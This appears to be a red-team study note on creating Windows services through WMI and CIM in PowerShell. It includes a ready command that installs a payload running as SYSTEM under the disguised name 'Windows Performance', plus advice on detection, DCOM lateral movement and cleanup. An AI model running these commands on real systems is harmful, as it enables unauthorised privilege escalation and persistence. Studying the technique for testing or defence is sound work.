
> [!abstract] Windows Service Management via WMI & CIM
> Using Windows Management Instrumentation (WMI) and Common Information Model (CIM) to enumerate and create Windows services. This technique is heavily used by attackers for Privilege Escalation (running payloads as `NT AUTHORITY\SYSTEM`) and Lateral Movement via DCOM/RPC.
> **MITRE ATT&CK Mapping:** [T1543.003 - Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)

## 1. Enumerating Service Methods

> [!info]+ Listing WMI/CIM Methods
> Before creating a service, you can enumerate the available methods (like `StartService`, `StopService`, `Create`) of the `Win32_Service` class.
> 
> **Using WMI** (`gwmi`)**:**
> ```powershell
> # List all services
> gwmi -class win32_service
> 
> # List all available methods for the service class
> (gwmi -class win32_service -list).methods | select Name
> ```
> 
> **Using CIM** (`gcim`)**:**
> ```powershell
> # List all services
> gcim -ClassName win32_service
> 
> # List all available methods
> (get-cimclass -ClassName win32_service).cimclassmethods
> ```

---

## 2. Creating a Malicious Service

> [!danger]+ Spawning a SYSTEM Process via WMI
> You can use the `Create` method of `Win32_Service` to install a new service that executes your payload. This is a stealthy way to execute code as SYSTEM without using standard binaries like `sc.exe` or `psexec.exe`.
> 
> **Step 1: Explore the** `Create` **Method Parameters**
> ```powershell
> # View the Create method details (WMI)
> (gwmi -Class Win32_service -list).methods
> (gwmi -Class Win32_service -list).create
> 
> # View the Create method parameters (CIM)
> ((get-cimclass -ClassName win32_service).cimclassmethods | ? {$_.Name -eq "create"}).Parameters
> ```
> 
> **Method Signature (OverloadDefinitions):**
> ```text
> System.Management.ManagementBaseObject Create(
>     System.String Name, 
>     System.String DisplayName, 
>     System.String PathName, 
>     System.Byte ServiceType,
>     System.Byte ErrorControl, 
>     System.String StartMode, 
>     System.Boolean DesktopInteract, 
>     System.String StartName, 
>     System.String StartPassword, 
>     System.String LoadOrderGroup, 
>     System.String[] LoadOrderGroupDependencies, 
>     System.String[] ServiceDependencies
> )
> ```

> [!bug]+ Step 2: Execute the `Create` Method
> *Define the byte values for ServiceType and ErrorControl, then pass the arguments in the exact order of the method signature.*
> 
> ```powershell
> # 1. Define byte variables
> $servicetype = [byte] 16   # 16 = Own Process (WIN32_OWN_PROCESS)
> $errorcontrol = [byte] 1   # 1 = Ignore errors
> 
> # 2. Invoke the Create method using positional arguments
> # Argument order: DesktopInteract, DisplayName, ErrorControl, LoadOrderGroup, LoadOrderGroupDependencies, Name, PathName, ServiceDependencies, ServiceType, StartMode, StartName, StartPassword
> 
> invoke-wmimethod -Class win32_service -Name Create -ArgumentList $false,"Windows Performance",$errorcontrol,$null,$null,"venom","C:\Users\mal.exe",$null,$servicetype,"Manual","NT AUTHORITY\SYSTEM",""
> ```
> 
> **Parameter Breakdown:**
> - **Name:** `"venom"` (Internal name of the service)
> - **DisplayName:** `"Windows Performance"` (Name shown in services.msc)
> - **PathName:** `"C:\Users\mal.exe"` (Path to your malicious executable)
> - **StartMode:** `"Manual"` (Or `"Automatic"`)
> - **StartName:** `"NT AUTHORITY\SYSTEM"` (The account the service will run as)
> - **DesktopInteract:** `$false` (Service cannot interact with the desktop)

> [!tip] OPSEC & Detection
> - **Event Logs:** Creating a service generates **Event ID 7045** (A service was installed in the system) in the System log. Defenders heavily monitor this event, especially when the `ServiceType` is `Own Process` and the `StartName` is `LocalSystem`.
> - **Network Traffic:** WMI service creation over the network uses DCOM (TCP Port 135 and dynamic high ports). It does not require SMB (Port 445), making it a popular alternative to PsExec for lateral movement.
> - **Cleanup:** Don't forget to delete the service after execution: `invoke-wmimethod -Class win32_service -Name Delete -Filter "Name='venom'"`

